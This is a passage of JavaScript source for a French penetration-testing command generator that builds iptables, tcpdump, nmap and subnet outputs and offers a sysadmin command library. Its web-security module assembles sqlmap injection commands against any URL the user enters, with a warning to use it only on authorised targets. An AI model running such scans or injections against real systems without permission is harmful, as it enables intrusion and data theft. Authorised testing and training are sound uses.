/* =========================================================================
 * NetCmd Pro - Générateur de commandes réseau & sysadmin
 * Outil pédagogique (labs HackTheBox/TryHackMe, audits autorisés).
 * ========================================================================= */
document.addEventListener('DOMContentLoaded', () => {

    'use strict';

    const $ = (id) => document.getElementById(id);

    // =========================================================================
    // 0. UTILITAIRES (COPIE & TOAST)
    // =========================================================================

    let toastTimeout;
    function showToast(message) {
        let toast = $('toast-notification');
        if (!toast) {
            toast = document.createElement('div');
            toast.id = 'toast-notification';
            toast.className = 'toast';
            document.body.appendChild(toast);
        }
        toast.textContent = message || 'Copié !';
        toast.classList.add('show');
        if (toastTimeout) clearTimeout(toastTimeout);
        toastTimeout = setTimeout(() => toast.classList.remove('show'), 3000);
    }

    function copyText(text) {
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(text)
                .then(() => showToast('Copié dans le presse-papiers !'))
                .catch(() => fallbackCopy(text));
        } else {
            fallbackCopy(text);
        }
    }

    function fallbackCopy(text) {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.select();
        try { document.execCommand('copy'); showToast('Copié !'); }
        catch (e) { showToast('Copie impossible'); }
        document.body.removeChild(ta);
    }

    // Copie le texte brut d'un élément (par ID) — utilisée par les onclick inline
    window.copyTextFromElement = function (elementId) {
        const el = $(elementId);
        if (!el) return;
        copyText((el.innerText || el.textContent).trim());
    };
    // Alias historique
    window.copyOutput = function (id) { window.copyTextFromElement(id); };

    // Télécharge un contenu texte sous forme de fichier
    function downloadFile(filename, text, mime) {
        const blob = new Blob([text], { type: (mime || 'text/plain') + ';charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        showToast('Fichier exporté : ' + filename);
    }

    function escapeHtml(str) {
        return String(str).replace(/[&<>"']/g, (c) => (
            { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]
        ));
    }

    // =========================================================================
    // 1. NAVIGATION ENTRE MODULES
    // =========================================================================

    const moduleKeys = ['firewall', 'pivoting', 'traffic', 'scan', 'subnet',
        'webaudit', 'revshell', 'encoder', 'library', 'favorites', 'cheatsheet', 'methodology', 'arsenal', 'guides'];
    const modules = {};
    moduleKeys.forEach(k => { modules[k] = $('module-' + k); });

    const statusText = $('status-text');
    const prettyNames = {
        firewall: 'Pare-feu', pivoting: 'Pivoting', traffic: 'Trafic', scan: 'Scan',
        subnet: 'Calculateur IP', webaudit: 'Sécurité Web', revshell: 'Reverse Shells',
        encoder: 'Encodeur', library: 'Bibliothèque', favorites: 'Favoris', cheatsheet: 'Cheat-sheet',
        methodology: 'Méthodologie', arsenal: 'Arsenal', guides: 'Guides'
    };

    function updateSidebarStyle(activeModuleId) {
        document.querySelectorAll('[data-module]').forEach(link => {
            const modName = link.getAttribute('data-module');
            const icon = link.querySelector('iconify-icon');
            link.className = 'flex items-center gap-2.5 px-2 py-1.5 text-sm text-zinc-400 hover:text-zinc-100 hover:bg-zinc-900/60 rounded transition-all cursor-pointer';
            if (icon) icon.className = 'transition-colors';
            if (modName === activeModuleId) {
                link.className = 'flex items-center gap-2.5 px-2 py-1.5 text-sm text-white bg-zinc-800/60 rounded border border-zinc-700/50 shadow-sm transition-all cursor-default';
                if (icon) icon.className = 'text-accent-500';
            }
        });
    }

    function showModule(modKey) {
        if (!modules[modKey]) modKey = 'firewall';
        Object.values(modules).forEach(el => { if (el) el.classList.add('hidden'); });
        if (modules[modKey]) modules[modKey].classList.remove('hidden');

        updateSidebarStyle(modKey);
        if (statusText) statusText.textContent = 'Module : ' + (prettyNames[modKey] || modKey);

        if (modKey === 'library') triggerCmdSearch();
        if (modKey === 'favorites') renderFavorites();
        if (modKey === 'firewall') updateFirewallCommand();
        if (modKey === 'cheatsheet') renderCheatsheet();
        if (modKey === 'methodology') renderMethodology();
        if (modKey === 'arsenal') initArsenal();
        if (modKey === 'guides') renderGuides();
    }

    document.querySelectorAll('[data-module]').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            showModule(link.getAttribute('data-module'));
        });
    });

    // Recherche globale (bouton + ⌘K / Ctrl+K) -> ouvre la bibliothèque
    const searchButton = $('search-button');
    if (searchButton) {
        searchButton.addEventListener('click', () => {
            showModule('library');
            const q = $('cmdlib-query');
            if (q) q.focus();
        });
    }
    document.addEventListener('keydown', (e) => {
        if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === 'k') {
            e.preventDefault();
            showModule('library');
            const q = $('cmdlib-query');
            if (q) q.focus();
        }
    });

    // =========================================================================
    // 2. PARE-FEU (IPTABLES)
    // =========================================================================

    const chainSelect = $('chain-select');
    const protocolSelect = $('protocol-select');
    const sourceInput = $('source-input');
    const ifaceInput = $('iface-input');
    const portsInput = $('input-ports');
    const stateCheckboxes = document.querySelectorAll('input[data-state]');

    function updateFirewallCommand() {
        const out = $('code-output');
        if (!chainSelect || !out) return;

        const chain = chainSelect.value;
        const protocol = protocolSelect.value;
        const ip = sourceInput.value.trim();
        const iface = ifaceInput.value.trim();
        const ports = portsInput.value.trim();
        const action = ($('input-action') && $('input-action').value) || 'ACCEPT';

        const states = Array.from(stateCheckboxes)
            .filter(c => c.checked)
            .map(c => c.getAttribute('data-state'));

        let html = '<div class="text-zinc-500 select-none mb-2"># Généré par NetCmd Pro</div>';
        html += '<div class="leading-7 break-all"><span class="text-purple-400">iptables</span> ';
        html += '<span class="text-zinc-300">-A ' + chain + '</span>';

        if (iface) {
            const flag = (chain === 'OUTPUT') ? '-o' : '-i';
            html += ' <span class="text-zinc-300">' + flag + ' ' + escapeHtml(iface) + '</span>';
        }
        if (ip) html += ' <span class="text-zinc-300">-s <span class="text-blue-300">' + escapeHtml(ip) + '</span></span>';
        if (protocol && protocol !== 'all') html += ' <span class="text-zinc-300">-p ' + protocol + '</span>';

        if (ports && protocol !== 'icmp' && protocol !== 'all') {
            const multi = /[,]/.test(ports);
            if (multi) {
                html += ' <span class="text-zinc-300">-m multiport --dports <span class="text-amber-300">' + escapeHtml(ports) + '</span></span>';
            } else {
                html += ' <span class="text-zinc-300">--dport <span class="text-amber-300">' + escapeHtml(ports) + '</span></span>';
            }
        }

        if (states.length) {
            html += ' <span class="text-zinc-300">-m conntrack --ctstate <span class="text-cyan-300">' + states.join(',') + '</span></span>';
        }

        const actionColor = action === 'ACCEPT' ? 'text-emerald-400' : 'text-red-400';
        html += ' <span class="text-zinc-300">-j </span><span class="' + actionColor + '">' + action + '</span></div>';

        out.innerHTML = html;
    }

    window.setAction = function (action) {
        const hidden = $('input-action');
        if (hidden) hidden.value = action;
        document.querySelectorAll('[data-action-value]').forEach(btn => {
            const val = btn.getAttribute('data-action-value');
            btn.classList.remove('bg-emerald-500/10', 'text-emerald-400', 'border-emerald-500/20',
                'bg-red-500/10', 'text-red-400', 'border-red-500/20', 'text-zinc-500');
            if (val === action) {
                if (action === 'ACCEPT') btn.classList.add('bg-emerald-500/10', 'text-emerald-400', 'border-emerald-500/20');
                else btn.classList.add('bg-red-500/10', 'text-red-400', 'border-red-500/20');
            } else {
                btn.classList.add('text-zinc-500');
            }
        });
        updateFirewallCommand();
    };

    [chainSelect, protocolSelect, sourceInput, ifaceInput, portsInput].forEach(el => {
        if (el) el.addEventListener('input', updateFirewallCommand);
    });
    stateCheckboxes.forEach(c => c.addEventListener('change', updateFirewallCommand));

    // =========================================================================
    // 3. TRAFIC (TCPDUMP)
    // =========================================================================

    const trafficBuildBtn = $('traffic-build');
    if (trafficBuildBtn) {
        trafficBuildBtn.addEventListener('click', () => {
            const iface = ($('traffic-iface').value || 'eth0').trim();
            const filter = ($('traffic-filter').value || '').trim();
            const mode = $('traffic-mode') ? $('traffic-mode').value : 'live';
            const file = ($('traffic-file').value || 'capture.pcap').trim();
            const out = $('traffic-output');
            if (!out) return;

            let cmd = 'tcpdump -i ' + iface + ' -nn';
            if (mode === 'pcap') cmd += ' -w ' + file;
            if (filter) cmd += ' ' + filter;
            out.textContent = cmd;
        });
    }

    // =========================================================================
    // 4. SCAN (NMAP)
    // =========================================================================

    const scanBuildBtn = $('scan-build');
    if (scanBuildBtn) {
        scanBuildBtn.addEventListener('click', () => {
            const target = ($('scan-target').value || '127.0.0.1').trim();
            const profile = ($('scan-profile') && $('scan-profile').value) || '';
            const ports = ($('scan-ports').value || '').trim();
            const extra = ($('scan-extra') && $('scan-extra').value || '').trim();
            const out = $('scan-output');

            let cmd = 'nmap';
            if (profile) cmd += ' ' + profile;
            if (ports) cmd += ' -p ' + ports;
            if (extra) cmd += ' ' + extra;
            cmd += ' ' + target;
            if (out) out.textContent = cmd;
        });
    }

    // =========================================================================
    // 5. CALCULATEUR IP (SOUS-RÉSEAUX)
    // =========================================================================

    function ipToInt(ip) {
        return ip.split('.').reduce((res, octet) => (res << 8) + parseInt(octet, 10), 0) >>> 0;
    }
    function intToIp(int) {
        return [(int >>> 24) & 0xFF, (int >>> 16) & 0xFF, (int >>> 8) & 0xFF, int & 0xFF].join('.');
    }
    function getIpClass(firstOctet) {
        if (firstOctet >= 1 && firstOctet <= 126) return 'Classe A';
        if (firstOctet >= 128 && firstOctet <= 191) return 'Classe B';
        if (firstOctet >= 192 && firstOctet <= 223) return 'Classe C';
        if (firstOctet >= 224 && firstOctet <= 239) return 'Classe D (Multicast)';
        return 'Classe E / Réservé';
    }
    function isValidIp(ip) {
        const parts = ip.split('.');
        if (parts.length !== 4) return false;
        return parts.every(p => /^\d+$/.test(p) && +p >= 0 && +p <= 255);
    }

    const btnCalcSubnet = $('btn-calc-subnet');
    if (btnCalcSubnet) {
        btnCalcSubnet.addEventListener('click', (e) => {
            e.preventDefault();
            const ipVal = ($('subnet-ip').value || '192.168.1.1').trim();
            const cidr = parseInt($('subnet-mask').value, 10);
            const results = $('subnet-results');
            if (!results) return;

            if (!isValidIp(ipVal)) {
                results.innerHTML = '<p class="text-red-400">Adresse IPv4 invalide : « ' + escapeHtml(ipVal) + ' »</p>';
                return;
            }

            const ipInt = ipToInt(ipVal);
            const maskInt = cidr === 0 ? 0 : (0xFFFFFFFF << (32 - cidr)) >>> 0;
            const invMaskInt = (~maskInt) >>> 0;
            const netInt = (ipInt & maskInt) >>> 0;
            const broadcastInt = (netInt | invMaskInt) >>> 0;

            let firstHost, lastHost, count;
            if (cidr >= 31) { firstHost = netInt; lastHost = broadcastInt; count = (cidr === 31) ? 2 : 1; }
            else { firstHost = netInt + 1; lastHost = broadcastInt - 1; count = (broadcastInt - netInt - 1); }

            const firstOctet = parseInt(ipVal.split('.')[0], 10);
            const ipClass = getIpClass(firstOctet);
            const binStr = ipInt.toString(2).padStart(32, '0');
            const netBin = binStr.substring(0, cidr);
            const hostBin = binStr.substring(cidr);

            function row(label, value) {
                return '<div class="flex justify-between items-center border-b border-zinc-800/60 pb-2">' +
                    '<span class="text-zinc-400 text-sm">' + label + '</span>' +
                    '<span class="text-zinc-200 font-mono text-sm">' + value + '</span></div>';
            }

            results.innerHTML =
                '<div class="w-full h-full flex flex-col text-left">' +
                    '<div class="grid grid-cols-2 gap-6 mb-8">' +
                        '<div class="bg-zinc-900/40 p-4 rounded-lg border border-zinc-800">' +
                            '<div class="text-[10px] text-zinc-500 uppercase font-bold tracking-wider mb-1">Adresse Réseau</div>' +
                            '<div class="text-xl font-mono text-emerald-400">' + intToIp(netInt) + '</div>' +
                            '<div class="text-xs text-zinc-600 mt-1">' + ipClass + '</div>' +
                        '</div>' +
                        '<div class="bg-zinc-900/40 p-4 rounded-lg border border-zinc-800">' +
                            '<div class="text-[10px] text-zinc-500 uppercase font-bold tracking-wider mb-1">Broadcast</div>' +
                            '<div class="text-xl font-mono text-purple-400">' + intToIp(broadcastInt) + '</div>' +
                            '<div class="text-xs text-zinc-600 mt-1">Dernière adresse</div>' +
                        '</div>' +
                    '</div>' +
                    '<div class="space-y-4 mb-8">' +
                        row('Premier hôte utilisable', intToIp(firstHost)) +
                        row('Dernier hôte utilisable', intToIp(lastHost)) +
                        row('Masque de sous-réseau', intToIp(maskInt)) +
                        row('Masque générique (wildcard)', intToIp(invMaskInt)) +
                        '<div class="flex justify-between items-center border-b border-zinc-800/60 pb-2">' +
                            '<span class="text-zinc-400 text-sm">Nombre d\'hôtes utilisables</span>' +
                            '<span class="text-white bg-accent-600/20 text-accent-400 px-2 py-0.5 rounded text-xs font-bold">' + count.toLocaleString('fr-FR') + '</span>' +
                        '</div>' +
                    '</div>' +
                    '<div class="mt-auto bg-black/20 rounded-lg p-4 border border-zinc-800">' +
                        '<div class="flex items-center justify-between mb-3">' +
                            '<span class="text-[10px] text-zinc-500 uppercase font-bold">Visualisation Binaire</span>' +
                            '<span class="text-[10px] text-zinc-600">/' + cidr + '</span>' +
                        '</div>' +
                        '<div class="font-mono text-xs break-all tracking-wider leading-relaxed">' +
                            '<span class="text-accent-400 border-b-2 border-accent-500/50 pb-0.5" title="Partie Réseau">' + netBin + '</span>' +
                            '<span class="text-zinc-500 border-b-2 border-zinc-700/50 pb-0.5" title="Partie Hôte">' + hostBin + '</span>' +
                        '</div>' +
                        '<div class="flex gap-4 mt-3 text-[10px]">' +
                            '<div class="flex items-center gap-1.5"><div class="w-2 h-2 rounded-full bg-accent-500"></div><span class="text-zinc-400">Bits Réseau</span></div>' +
                            '<div class="flex items-center gap-1.5"><div class="w-2 h-2 rounded-full bg-zinc-600"></div><span class="text-zinc-400">Bits Hôte</span></div>' +
                        '</div>' +
                    '</div>' +
                '</div>';
        });
    }

    // =========================================================================
    // 6. FAVORIS (localStorage)
    // =========================================================================

    const FAV_KEY = 'netcmd_favorites';

    function loadFavorites() {
        try { return JSON.parse(localStorage.getItem(FAV_KEY)) || []; }
        catch (e) { return []; }
    }
    function saveFavorites(list) {
        try { localStorage.setItem(FAV_KEY, JSON.stringify(list)); } catch (e) {}
    }
    function isFavorite(cmd) {
        return loadFavorites().some(f => f.cmd === cmd);
    }
    function toggleFavorite(fav) {
        let list = loadFavorites();
        const idx = list.findIndex(f => f.cmd === fav.cmd);
        if (idx >= 0) { list.splice(idx, 1); showToast('Retiré des favoris'); }
        else { list.push(fav); showToast('Ajouté aux favoris ★'); }
        saveFavorites(list);
        if (modules.favorites && !modules.favorites.classList.contains('hidden')) renderFavorites();
    }

    const favResults = $('fav-results');
    const favOsHidden = $('fav-os');
    const favOsButtons = document.querySelectorAll('.fav-os');

    favOsButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            const os = btn.getAttribute('data-os') || 'windows';
            if (favOsHidden) favOsHidden.value = os;
            favOsButtons.forEach(b => {
                b.classList.remove('bg-accent-600', 'text-white');
                b.classList.add('text-zinc-300', 'hover:bg-zinc-800');
            });
            btn.classList.remove('text-zinc-300', 'hover:bg-zinc-800');
            btn.classList.add('bg-accent-600', 'text-white');
            renderFavorites();
        });
    });

    function renderFavorites() {
        if (!favResults) return;
        const list = loadFavorites();
        const os = (favOsHidden && favOsHidden.value) || 'windows';
        const filtered = list.filter(f => !f.os || f.os === os || f.os === 'network' || f.os === 'cli' || f.os === 'all');

        let html = '<div class="flex items-center justify-between mb-3">' +
            '<span class="text-[11px] text-zinc-500">' + list.length + ' favori(s) enregistré(s)</span>' +
            '<div class="flex gap-2">' +
                '<button id="fav-export" class="text-[10px] px-2 py-1 rounded border border-zinc-700 text-zinc-300 hover:bg-zinc-800 transition-colors">Exporter .txt</button>' +
                '<button id="fav-clear" class="text-[10px] px-2 py-1 rounded border border-red-500/30 text-red-400 hover:bg-red-500/10 transition-colors">Tout vider</button>' +
            '</div></div>';

        if (!filtered.length) {
            html += '<p class="text-zinc-500 italic">Aucun favori pour cet OS. Ajoute des commandes depuis la Bibliothèque (icône ★).</p>';
        } else {
            filtered.forEach(fav => {
                const uid = 'fav-' + Math.random().toString(36).slice(2, 9);
                html += '<div class="border border-zinc-800 rounded-lg p-3 space-y-2 bg-zinc-950/60 mb-3">' +
                    '<div class="flex items-center justify-between">' +
                        '<div class="text-xs font-semibold text-zinc-100">' + escapeHtml(fav.title || 'Commande') + '</div>' +
                        '<button class="fav-remove text-amber-400 hover:text-red-400 transition-colors" data-cmd="' + escapeHtml(fav.cmd) + '" title="Retirer"><iconify-icon icon="lucide:star" width="14"></iconify-icon></button>' +
                    '</div>' +
                    '<pre id="' + uid + '" class="bg-zinc-900 border border-zinc-800 rounded px-2 py-1.5 text-[11px] text-zinc-100 overflow-x-auto font-mono cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'' + uid + '\')">' + escapeHtml(fav.cmd) + '</pre>' +
                '</div>';
            });
        }
        favResults.innerHTML = html;

        const exportBtn = $('fav-export');
        if (exportBtn) exportBtn.addEventListener('click', exportFavorites);
        const clearBtn = $('fav-clear');
        if (clearBtn) clearBtn.addEventListener('click', () => {
            if (confirm('Supprimer tous les favoris ?')) { saveFavorites([]); renderFavorites(); }
        });
        favResults.querySelectorAll('.fav-remove').forEach(btn => {
            btn.addEventListener('click', () => toggleFavorite({ cmd: btn.getAttribute('data-cmd') }));
        });
    }

    function exportFavorites() {
        const list = loadFavorites();
        if (!list.length) { showToast('Aucun favori à exporter'); return; }
        const text = list.map(f => '# ' + (f.title || 'Commande') + ' [' + (f.os || 'cli') + ']\n' + f.cmd).join('\n\n');
        const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'netcmd-favoris.txt';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        showToast('Favoris exportés');
    }

    // =========================================================================
    // 7. BIBLIOTHÈQUE DE COMMANDES
    // =========================================================================

    const cmdlibOsHidden = $('cmdlib-os');
    const cmdlibOsButtons = document.querySelectorAll('.cmdlib-os');
    const cmdlibSearchBtn = $('cmdlib-search');
    const cmdlibQueryInput = $('cmdlib-query');
    const cmdlibResults = $('cmdlib-results');

    const commandLibrary = [
        {
            id: 'huawei-switch-basic', keywords: ['huawei', 'switch', 'configurer', 'vlan'],
            title: 'Configuration basique switch Huawei', os: 'network',
            steps: [
                { cmd: 'system-view', desc: 'Mode config' },
                { cmd: 'vlan 10', desc: 'Créer VLAN 10' },
                { cmd: 'interface GigabitEthernet 0/0/1', desc: 'Aller dans l\'interface' },
                { cmd: 'port link-type access', desc: 'Mode access' },
                { cmd: 'port default vlan 10', desc: 'Assigner le VLAN' }
            ]
        },
        {
            id: 'cisco-switch-basic', keywords: ['cisco', 'switch', 'vlan', 'configurer'],
            title: 'Configuration basique switch Cisco', os: 'network',
            steps: [
                { cmd: 'enable', desc: 'Mode privilégié' },
                { cmd: 'configure terminal', desc: 'Mode configuration' },
                { cmd: 'vlan 10', desc: 'Créer VLAN 10' },
                { cmd: 'interface GigabitEthernet0/1', desc: 'Sélectionner l\'interface' },
                { cmd: 'switchport mode access', desc: 'Mode access' },
                { cmd: 'switchport access vlan 10', desc: 'Assigner le VLAN' }
            ]
        },
        {
            id: 'ip-config', keywords: ['ip', 'adresse', 'configurer', 'reseau', 'network'],
            title: 'Voir l\'adresse IP', os: 'multi',
            perOs: {
                windows: [{ cmd: 'ipconfig /all', desc: 'Détails complets des cartes réseau.' }],
                macos: [{ cmd: 'ifconfig', desc: 'Lister les interfaces.' }, { cmd: 'ipconfig getifaddr en0', desc: 'IP de l\'interface Wi-Fi.' }],
                linux: [{ cmd: 'ip addr show', desc: 'Voir les adresses IP.' }]
            }
        },
        {
            id: 'install-package', keywords: ['installer', 'install', 'programme', 'logiciel', 'gedit', 'git', 'vlc', 'paquet'],
            title: 'Installer un logiciel', os: 'multi',
            perOs: {
                windows: [{ cmd: 'winget install <nom>', desc: 'Via Winget.' }],
                macos: [{ cmd: 'brew install <nom>', desc: 'Via Homebrew.' }],
                linux: [{ cmd: 'sudo apt install <nom>', desc: 'Debian/Ubuntu.' }]
            }
        },
        {
            id: 'flush-dns', keywords: ['dns', 'cache', 'vider', 'flush'],
            title: 'Vider le cache DNS', os: 'multi',
            perOs: {
                windows: [{ cmd: 'ipconfig /flushdns', desc: 'Vider le cache.' }],
                macos: [{ cmd: 'sudo killall -HUP mDNSResponder', desc: 'macOS récent.' }],
                linux: [{ cmd: 'sudo systemd-resolve --flush-caches', desc: 'Systemd.' }]
            }
        },
        {
            id: 'check-disk', keywords: ['disque', 'espace', 'stockage', 'disk'],
            title: 'Vérifier l\'espace disque', os: 'multi',
            perOs: {
                windows: [{ cmd: 'wmic logicaldisk get size,freespace,caption', desc: 'Via WMIC.' }],
                macos: [{ cmd: 'df -h', desc: 'Format lisible.' }],
                linux: [{ cmd: 'df -h', desc: 'Format lisible.' }]
            }
        },
        {
            id: 'ping-test', keywords: ['ping', 'test', 'connexion'],
            title: 'Tester la connexion (Ping)', os: 'multi',
            perOs: {
                windows: [{ cmd: 'ping google.com', desc: '4 paquets par défaut.' }],
                macos: [{ cmd: 'ping -c 4 google.com', desc: 'Limiter à 4 paquets.' }],
                linux: [{ cmd: 'ping -c 4 google.com', desc: 'Limiter à 4 paquets.' }]
            }
        },
        {
            id: 'ports-listen', keywords: ['port', 'ecoute', 'listen', 'netstat', 'ouvert'],
            title: 'Lister les ports en écoute', os: 'multi',
            perOs: {
                windows: [{ cmd: 'netstat -ano | findstr LISTENING', desc: 'Ports + PID.' }],
                macos: [{ cmd: 'lsof -i -P | grep LISTEN', desc: 'Ports en écoute.' }],
                linux: [{ cmd: 'ss -tulpn', desc: 'Sockets TCP/UDP en écoute.' }]
            }
        },
        {
            id: 'kill-process', keywords: ['tuer', 'kill', 'processus', 'process', 'arreter'],
            title: 'Tuer un processus', os: 'multi',
            perOs: {
                windows: [{ cmd: 'taskkill /PID <pid> /F', desc: 'Forcer l\'arrêt.' }],
                macos: [{ cmd: 'kill -9 <pid>', desc: 'Signal KILL.' }],
                linux: [{ cmd: 'kill -9 <pid>', desc: 'Signal KILL.' }]
            }
        },
        {
            id: 'route-table', keywords: ['route', 'passerelle', 'gateway', 'table'],
            title: 'Voir la table de routage', os: 'multi',
            perOs: {
                windows: [{ cmd: 'route print', desc: 'Table complète.' }],
                macos: [{ cmd: 'netstat -rn', desc: 'Table de routage.' }],
                linux: [{ cmd: 'ip route', desc: 'Table de routage.' }]
            }
        }
    ];

    cmdlibOsButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            const os = btn.getAttribute('data-os') || 'windows';
            if (cmdlibOsHidden) cmdlibOsHidden.value = os;
            cmdlibOsButtons.forEach(b => {
                b.classList.remove('bg-accent-600', 'text-white');
                b.classList.add('text-zinc-300', 'hover:bg-zinc-800');
            });
            btn.classList.remove('text-zinc-300', 'hover:bg-zinc-800');
            btn.classList.add('bg-accent-600', 'text-white');
            if (cmdlibQueryInput && cmdlibQueryInput.value.trim() !== '') triggerCmdSearch();
        });
    });

    function searchCommandLibrary(query) {
        const q = (query || '').toLowerCase().trim();
        if (!q) return [];
        const words = q.split(/\s+/).filter(Boolean);
        return commandLibrary.filter(item => {
            const hay = item.keywords.join(' ').toLowerCase() + ' ' + item.title.toLowerCase();
            return words.some(w => hay.includes(w));
        });
    }

    function renderCommandResults(items, os, container) {
        if (!container) return;
        if (!items || items.length === 0) {
            const query = cmdlibQueryInput ? cmdlibQueryInput.value.trim() : '';
            container.innerHTML = query === ''
                ? '<p class="text-zinc-500 italic">Entrez un mot-clé (ex: « installer », « dns ») et validez.</p>'
                : '<p class="text-zinc-500 italic">Aucun résultat pour « ' + escapeHtml(query) + ' ».</p>';
            return;
        }

        let html = '';
        items.forEach(item => {
            html += '<div class="border border-zinc-800 rounded-lg p-3 space-y-2 bg-zinc-950/60 hover:border-zinc-700 transition-colors">';
            html += '<div class="flex items-center justify-between"><div class="text-xs font-semibold text-zinc-100">' + escapeHtml(item.title) + '</div>' +
                '<div class="text-[10px] text-zinc-600 border border-zinc-800 px-1 rounded uppercase">' + (item.os === 'multi' ? os : (item.os === 'network' ? 'NET' : 'CLI')) + '</div></div>';

            let steps = [];
            if (item.os === 'network') steps = item.steps || [];
            else if (item.os === 'multi' && item.perOs) steps = item.perOs[os] || [];

            if (!steps.length) {
                html += '<p class="text-[11px] text-zinc-500 italic">Aucune commande spécifique pour cet OS.</p>';
            } else {
                steps.forEach(step => {
                    const uid = 'cmd-' + Math.random().toString(36).slice(2, 9);
                    const favId = item.os === 'network' ? 'network' : os;
                    const fav = isFavorite(step.cmd);
                    html += '<div class="flex items-center gap-2">' +
                        '<pre id="' + uid + '" class="flex-1 bg-zinc-900 border border-zinc-800 rounded px-2 py-1.5 text-[11px] text-zinc-100 overflow-x-auto font-mono cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'' + uid + '\')">' + escapeHtml(step.cmd) + '</pre>' +
                        '<button class="lib-fav shrink-0 ' + (fav ? 'text-amber-400' : 'text-zinc-600 hover:text-amber-400') + ' transition-colors" ' +
                            'data-cmd="' + escapeHtml(step.cmd) + '" data-title="' + escapeHtml(item.title) + '" data-os="' + favId + '" title="Ajouter aux favoris">' +
                            '<iconify-icon icon="lucide:star" width="15"></iconify-icon></button>' +
                    '</div>';
                    html += '<p class="text-[10px] text-zinc-500 mb-1 ml-1">' + escapeHtml(step.desc) + '</p>';
                });
            }
            html += '</div>';
        });
        container.innerHTML = html;

        container.querySelectorAll('.lib-fav').forEach(btn => {
            btn.addEventListener('click', () => {
                toggleFavorite({
                    cmd: btn.getAttribute('data-cmd'),
                    title: btn.getAttribute('data-title'),
                    os: btn.getAttribute('data-os')
                });
                const nowFav = isFavorite(btn.getAttribute('data-cmd'));
                btn.className = 'lib-fav shrink-0 ' + (nowFav ? 'text-amber-400' : 'text-zinc-600 hover:text-amber-400') + ' transition-colors';
            });
        });
    }

    function triggerCmdSearch() {
        if (!cmdlibQueryInput || !cmdlibOsHidden) return;
        const items = searchCommandLibrary(cmdlibQueryInput.value);
        renderCommandResults(items, cmdlibOsHidden.value || 'windows', cmdlibResults);
    }

    if (cmdlibSearchBtn) cmdlibSearchBtn.addEventListener('click', triggerCmdSearch);
    if (cmdlibQueryInput) {
        cmdlibQueryInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') { e.preventDefault(); triggerCmdSearch(); }
        });
    }
    if (cmdlibResults) {
        cmdlibResults.innerHTML = '<p class="text-zinc-500 italic">Sélectionnez un système et tapez une recherche...</p>';
    }

    // =========================================================================
    // 8. SÉCURITÉ WEB (ANALYSE URL + SQLMAP)
    // =========================================================================

    function cleanUrlForDomain(url) {
        let domain = url.replace(/^(?:https?:\/\/)?(?:www\.)?/i, '');
        return domain.split('/')[0];
    }

    const urlBuildBtn = $('url-build-cmd');
    if (urlBuildBtn) {
        urlBuildBtn.addEventListener('click', () => {
            const rawUrl = ($('url-target').value || 'exemple.com').trim();
            const domain = cleanUrlForDomain(rawUrl);
            const fullUrl = rawUrl.startsWith('http') ? rawUrl : 'https://' + rawUrl;
            const out = $('webaudit-output');
            if (!out) return;
            function block(label, id, cmd) {
                return '<div><div class="text-blue-500 text-[10px] uppercase font-bold tracking-widest mb-1">' + label + ' :</div>' +
                    '<pre class="bg-zinc-900 p-2 rounded border border-zinc-800 text-zinc-200 cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'' + id + '\')"><code id="' + id + '">' + cmd + '</code></pre></div>';
            }
            out.innerHTML =
                '<div class="space-y-4">' +
                    block('1. En-têtes HTTP (serveur, sécurité)', 'cmd-curl', 'curl -I -L "' + escapeHtml(fullUrl) + '"') +
                    block('2. Enregistrement (propriétaire / WHOIS)', 'cmd-whois', 'whois ' + escapeHtml(domain)) +
                    block('3. Résolution DNS', 'cmd-nslookup', 'nslookup ' + escapeHtml(domain)) +
                '</div>';
        });
    }

    const urlVtBtn = $('url-virustotal');
    if (urlVtBtn) {
        urlVtBtn.addEventListener('click', () => {
            const rawUrl = ($('url-target').value || 'exemple.com').trim();
            const domain = cleanUrlForDomain(rawUrl);
            window.open('https://www.virustotal.com/gui/domain/' + encodeURIComponent(domain) + '/detection', '_blank');
        });
    }

    const sqlBuildBtn = $('sql-build');
    if (sqlBuildBtn) {
        sqlBuildBtn.addEventListener('click', () => {
            const url = ($('sql-url').value || 'http://example.com/page.php?id=1').trim();
            const action = $('sql-action').value;
            const risk = $('sql-risk').value;
            const batch = $('sql-batch').checked ? '--batch ' : '';
            const out = $('webaudit-output');
            const fullCmd = 'sqlmap -u "' + url + '" ' + action + ' ' + risk + ' ' + batch + '--random-agent';
            if (!out) return;
            out.innerHTML =
                '<div class="space-y-2">' +
                    '<div class="text-orange-500 text-[10px] uppercase font-bold tracking-widest">Commande sqlmap générée :</div>' +
                    '<pre class="bg-zinc-900 p-3 rounded border border-zinc-800 text-zinc-200 whitespace-pre-wrap break-all cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'sql-cmd-text\')"><code id="sql-cmd-text">' + escapeHtml(fullCmd) + '</code></pre>' +
                    '<div class="text-zinc-500 text-[10px]">⚠ Uniquement sur une cible dont tu as l\'autorisation explicite.</div>' +
                '</div>';
        });
    }

    // =========================================================================
    // 9. PIVOTING & TUNNELS SSH
    // =========================================================================

    const pivotTypeSelect = $('pivot-type');
    const targetBlock = $('target-block');
    const btnBuildPivot = $('btn-build-pivot');

    if (pivotTypeSelect && targetBlock) {
        pivotTypeSelect.addEventListener('change', (e) => {
            targetBlock.classList.toggle('opacity-50', e.target.value === 'dynamic');
            targetBlock.classList.toggle('pointer-events-none', e.target.value === 'dynamic');
        });
        targetBlock.classList.add('opacity-50', 'pointer-events-none');
    }

    if (btnBuildPivot) {
